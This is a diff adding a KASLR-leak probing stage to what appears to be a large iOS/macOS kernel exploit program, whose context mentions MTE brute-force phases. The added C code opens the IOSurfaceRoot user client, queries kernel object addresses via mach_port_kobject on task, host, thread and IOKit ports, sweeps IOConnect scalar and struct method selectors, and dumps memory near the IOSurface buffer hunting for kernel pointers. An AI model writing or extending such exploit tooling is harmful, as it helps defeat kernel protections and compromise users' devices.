@@ -17511,6 +17511,194 @@ new_modes:
             rlog("*** rounds=%d: fast-path to Phase 13 (MTE brute-force) ***\n", rounds);
             goto phase12_done;
         }
+        if (rounds == 240) {
+            rlog("*** rounds=240: IOSurface property/Mach port KASLR probe ***\n");
+
+            /* Open IOSurfaceRoot user client */
+            io_service_t svc240 = IOServiceGetMatchingService(kIOMasterPortDefault,
+                IOServiceMatching("IOSurfaceRoot"));
+            rlog("  IOSurfaceRoot service: 0x%x\n", svc240);
+            io_connect_t conn240 = 0;
+            kern_return_t kr240 = IOServiceOpen(svc240, mach_task_self(), 0, &conn240);
+            rlog("  IOServiceOpen: kr=%d conn=0x%x\n", kr240, conn240);
+
+            /* Create a test IOSurface */
+            CFMutableDictionaryRef p240 = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            int w240=64, h240=64, bpr240=256, as240=bpr240*h240, pf240=0x42475241;
+            CFNumberRef w240r = CFNumberCreate(NULL, kCFNumberIntType, &w240);
+            CFNumberRef h240r = CFNumberCreate(NULL, kCFNumberIntType, &h240);
+            CFNumberRef b240r = CFNumberCreate(NULL, kCFNumberIntType, &bpr240);
+            CFNumberRef a240r = CFNumberCreate(NULL, kCFNumberIntType, &as240);
+            CFNumberRef f240r = CFNumberCreate(NULL, kCFNumberIntType, &pf240);
+            CFDictionarySetValue(p240, CFSTR("IOSurfaceWidth"), w240r);
+            CFDictionarySetValue(p240, CFSTR("IOSurfaceHeight"), h240r);
+            CFDictionarySetValue(p240, CFSTR("IOSurfaceBytesPerRow"), b240r);
+            CFDictionarySetValue(p240, CFSTR("IOSurfaceAllocSize"), a240r);
+            CFDictionarySetValue(p240, CFSTR("IOSurfacePixelFormat"), f240r);
+            IOSurfaceRef surf240 = IOSurfaceCreate(p240);
+            uint32_t sid240 = IOSurfaceGetID(surf240);
+            rlog("  IOSurface created: id=%u base=%p allocSize=%zu\n",
+                 sid240, IOSurfaceGetBaseAddress(surf240), IOSurfaceGetAllocSize(surf240));
+
+            /* Probe 1: Mach port for IOSurface */
+            mach_port_t surfPort = IOSurfaceCreateMachPort(surf240);
+            rlog("  IOSurface MachPort: 0x%x\n", surfPort);
+
+            /* Probe 2: mach_port_kobject on IOSurface port */
+            natural_t kotype = 0;
+            mach_vm_address_t koaddr = 0;
+            kr240 = mach_port_kobject(mach_task_self(), surfPort, &kotype, (unsigned int *)&koaddr);
+            rlog("  mach_port_kobject(surfPort): kr=%d type=%u addr=0x%llx\n",
+                 kr240, kotype, (unsigned long long)koaddr);
+
+            /* Probe 3: mach_port_kobject on IOKit connection */
+            kotype = 0; koaddr = 0;
+            kr240 = mach_port_kobject(mach_task_self(), conn240, &kotype, (unsigned int *)&koaddr);
+            rlog("  mach_port_kobject(conn): kr=%d type=%u addr=0x%llx\n",
+                 kr240, kotype, (unsigned long long)koaddr);
+
+            /* Probe 4: mach_port_kobject on task port */
+            kotype = 0; koaddr = 0;
+            kr240 = mach_port_kobject(mach_task_self(), mach_task_self(), &kotype, (unsigned int *)&koaddr);
+            rlog("  mach_port_kobject(task_self): kr=%d type=%u addr=0x%llx\n",
+                 kr240, kotype, (unsigned long long)koaddr);
+
+            /* Probe 5: task_info TASK_DYLD_INFO */
+            struct task_dyld_info dinfo;
+            mach_msg_type_number_t dcnt = TASK_DYLD_INFO_COUNT;
+            kr240 = task_info(mach_task_self(), TASK_DYLD_INFO, (task_info_t)&dinfo, &dcnt);
+            rlog("  task_dyld_info: kr=%d all_image_info=0x%llx size=%llu\n",
+                 kr240, dinfo.all_image_info_addr, dinfo.all_image_info_size);
+
+            /* Probe 6: IOSurfaceCopyAllValues - look for kernel pointers */
+            CFDictionaryRef allVals = IOSurfaceCopyAllValues(surf240);
+            if (allVals) {
+                CFIndex vcnt = CFDictionaryGetCount(allVals);
+                rlog("  IOSurfaceCopyAllValues: %ld entries\n", (long)vcnt);
+                const void **keys = malloc(sizeof(void*) * vcnt);
+                const void **vals = malloc(sizeof(void*) * vcnt);
+                CFDictionaryGetKeysAndValues(allVals, keys, vals);
+                for (CFIndex i = 0; i < vcnt && i < 30; i++) {
+                    char kbuf[256] = {0}, vbuf[512] = {0};
+                    CFStringRef kd = CFCopyDescription(keys[i]);
+                    CFStringRef vd = CFCopyDescription(vals[i]);
+                    if (kd) CFStringGetCString(kd, kbuf, sizeof(kbuf), kCFStringEncodingUTF8);
+                    if (vd) CFStringGetCString(vd, vbuf, sizeof(vbuf), kCFStringEncodingUTF8);
+                    rlog("    [%ld] %s = %.200s\n", (long)i, kbuf, vbuf);
+                    if (kd) CFRelease(kd);
+                    if (vd) CFRelease(vd);
+                }
+                free(keys); free(vals);
+                CFRelease(allVals);
+            } else {
+                rlog("  IOSurfaceCopyAllValues: NULL\n");
+            }
+
+            /* Probe 7: IOKit external method selectors 0-19 on IOSurfaceRootUserClient */
+            rlog("  Probing IOSurfaceRootUserClient selectors:\n");
+            for (uint32_t sel = 0; sel < 25; sel++) {
+                uint64_t in[4] = {sid240, 0, 0, 0};
+                uint64_t out[16] = {0};
+                uint32_t ocnt = 16;
+                kr240 = IOConnectCallScalarMethod(conn240, sel, in, 1, out, &ocnt);
+                if (kr240 == 0) {
+                    rlog("    sel%u: ok outcnt=%u", sel, ocnt);
+                    for (uint32_t j = 0; j < ocnt && j < 8; j++) {
+                        rlog(" [%u]=0x%llx", j, out[j]);
+                    }
+                    rlog("\n");
+                } else if (kr240 != 0xe00002c2 && kr240 != 0xe00002bc) {
+                    /* skip unsupported/bad-arg, show other errors */
+                    rlog("    sel%u: kr=0x%x\n", sel, kr240);
+                }
+            }
+
+            /* Probe 8: Try struct input/output methods */
+            rlog("  Probing struct methods:\n");
+            for (uint32_t sel = 0; sel < 25; sel++) {
+                char sin[256] = {0};
+                char sout[4096] = {0};
+                size_t soutlen = sizeof(sout);
+                *(uint32_t*)sin = sid240;
+                kr240 = IOConnectCallStructMethod(conn240, sel, sin, 64, sout, &soutlen);
+                if (kr240 == 0 && soutlen > 0) {
+                    rlog("    struct sel%u: ok outlen=%zu", sel, soutlen);
+                    uint64_t *sp = (uint64_t*)sout;
+                    for (size_t j = 0; j < soutlen/8 && j < 8; j++) {
+                        rlog(" [%zu]=0x%llx", j, sp[j]);
+                    }
+                    rlog("\n");
+                }
+            }
+
+            /* Probe 9: IOSurface shared memory inspection */
+            IOSurfaceLock(surf240, 0, NULL);
+            void *base240 = IOSurfaceGetBaseAddress(surf240);
+            rlog("  SharedMem base: %p\n", base240);
+            if (base240) {
+                /* Look at the page BEFORE the IOSurface data - might have metadata */
+                /* For safety, use mach_vm_read to avoid crashing on unmapped pages */
+                mach_vm_address_t preaddr = (mach_vm_address_t)base240 - 4096;
+                vm_offset_t data = 0;
+                mach_msg_type_number_t dataCnt = 0;
+                kr240 = mach_vm_read(mach_task_self(), preaddr, 4096, &data, &dataCnt);
+                if (kr240 == 0 && dataCnt > 0) {
+                    rlog("  Page before base IS mapped (%u bytes):\n", dataCnt);
+                    uint64_t *hp = (uint64_t*)data;
+                    for (int i = 0; i < 64 && i < (int)(dataCnt/8); i++) {
+                        if (hp[i] != 0) {
+                            rlog("    pre[%d]=0x%016llx\n", i, hp[i]);
+                        }
+                    }
+                    mach_vm_deallocate(mach_task_self(), data, dataCnt);
+                } else {
+                    rlog("  Page before base NOT mapped (kr=%d)\n", kr240);
+                }
+
+                /* Also check the IOSurface data itself for any embedded pointers */
+                uint64_t *bp = (uint64_t*)base240;
+                rlog("  First 128 bytes at base:\n");
+                for (int i = 0; i < 16; i++) {
+                    rlog("    +%03d: 0x%016llx\n", i*8, bp[i]);
+                }
+            }
+            IOSurfaceUnlock(surf240, 0, NULL);
+
+            /* Probe 10: host_info for kernel version/addresses */
+            host_t host = mach_host_self();
+            kotype = 0; koaddr = 0;
+            kr240 = mach_port_kobject(mach_task_self(), host, &kotype, (unsigned int *)&koaddr);
+            rlog("  mach_port_kobject(host): kr=%d type=%u addr=0x%llx\n",
+                 kr240, kotype, (unsigned long long)koaddr);
+
+            /* Probe 11: processor_set_default for host */
+            processor_set_name_t pset;
+            kr240 = processor_set_default(host, &pset);
+            rlog("  processor_set_default: kr=%d pset=0x%x\n", kr240, pset);
+            if (kr240 == 0) {
+                kotype = 0; koaddr = 0;
+                kr240 = mach_port_kobject(mach_task_self(), pset, &kotype, (unsigned int *)&koaddr);
+                rlog("  mach_port_kobject(pset): kr=%d type=%u addr=0x%llx\n",
+                     kr240, kotype, (unsigned long long)koaddr);
+            }
+
+            /* Probe 12: thread exception ports */
+            mach_port_t thread = mach_thread_self();
+            kotype = 0; koaddr = 0;
+            kr240 = mach_port_kobject(mach_task_self(), thread, &kotype, (unsigned int *)&koaddr);
+            rlog("  mach_port_kobject(thread): kr=%d type=%u addr=0x%llx\n",
+                 kr240, kotype, (unsigned long long)koaddr);
+
+            CFRelease(p240); CFRelease(w240r); CFRelease(h240r);
+            CFRelease(b240r); CFRelease(a240r); CFRelease(f240r);
+            if (svc240) IOObjectRelease(svc240);
+            if (conn240) IOServiceClose(conn240);
+            CFRelease(surf240);
+
+            rlog("*** Probe complete ***\n");
+            goto done;
+        }
         if (rounds >= 170 && rounds != 219 && rounds != 225) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
